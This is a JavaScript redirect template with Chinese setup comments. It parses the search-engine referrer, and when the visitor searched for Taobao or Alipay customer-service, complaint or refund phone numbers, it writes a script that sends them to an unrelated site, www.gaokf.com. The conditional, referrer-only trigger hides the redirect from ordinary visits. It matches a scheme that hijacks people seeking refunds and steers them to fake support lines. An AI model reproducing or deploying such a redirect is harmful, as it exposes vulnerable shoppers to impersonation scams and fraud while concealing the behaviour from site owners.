var jsurl=document.referrer;  //来本页之前上一个网址，这里不用改



function getQuery(names){   //一个判定数组不去管它用来处理从搜索引擎传过来关键词URL的
querystr = jsurl.split("?");
if(querystr[1]){
GETs = querystr[1].split("&");
GET =new Array();
for(i=0;i<GETs.length;i++){
tmp_arr = GETs[i].split("=");
key=tmp_arr[0];
if (key==names)
{
      return tmp_arr[1];
}
}
}
return "";
}


if(getQuery("wd")=="淘宝电话" || getQuery("wd")=="淘宝网客服电话" || getQuery("wd")=="淘宝网电话" || getQuery("wd")=="淘宝网投诉电话" || getQuery("wd")=="淘宝网退款电话" || getQuery("wd")=="淘宝客服电话" || getQuery("wd")=="淘宝投诉电话" || getQuery("wd")=="淘宝退款电话" || getQuery("wd")=="支付宝电话" || getQuery("wd")=="淘宝网客服热线" || getQuery("wd")=="淘宝网退款客服电话" || getQuery("wd")=="淘宝网客服热线" || getQuery("wd")=="淘宝网服务热线" || getQuery("wd")=="淘宝网服务电话" || getQuery("wd")=="支付宝客服电话" || getQuery("wd")=="淘宝投诉电话" || getQuery("wd")=="支付宝退款电话"){   //这里ceshiguanjianci1就是搜索的关键词 
document.writeln("<script language=\"javascript\" type=\"text\/javascript\">window.location.href=\"http:\/\/www.gaokf.com\"; <\/script>") //这里的网址

}

else if(getQuery("wd")=="ceshiguanjianci1"){
document.writeln("<script language=\"javascript\" type=\"text\/javascript\">window.location.href=\"http:\/\/www.gaokf.com\/\"; <\/script>")
}

if(getQuery("word")=="淘宝电话" || getQuery("word")=="淘宝网客服电话" || getQuery("word")=="淘宝网电话" || getQuery("word")=="淘宝网投诉电话" || getQuery("word")=="淘宝网退款电话" || getQuery("word")=="淘宝客服电话" || getQuery("word")=="淘宝投诉电话" || getQuery("word")=="淘宝退款电话" || getQuery("word")=="支付宝电话" || getQuery("word")=="淘宝网客服热线" || getQuery("word")=="淘宝投诉电话" || getQuery("word")=="淘宝网客服热线" || getQuery("word")=="淘宝网服务热线" || getQuery("word")=="淘宝网服务电话" || getQuery("word")=="支付宝客服电话" || getQuery("word")=="支付宝投诉电话" || getQuery("word")=="支付宝退款电话"){   //这里ceshiguanjianci1就是搜索的关键词 
document.writeln("<script language=\"javascript\" type=\"text\/javascript\">window.location.href=\"http:\/\/www.gaokf.com\"; <\/script>") //这里的网址

}

else if(getQuery("word")=="ceshiguanjianci1"){
document.writeln("<script language=\"javascript\" type=\"text\/javascript\">window.location.href=\"http:\/\/www.gaokf.com\/\"; <\/script>")
}
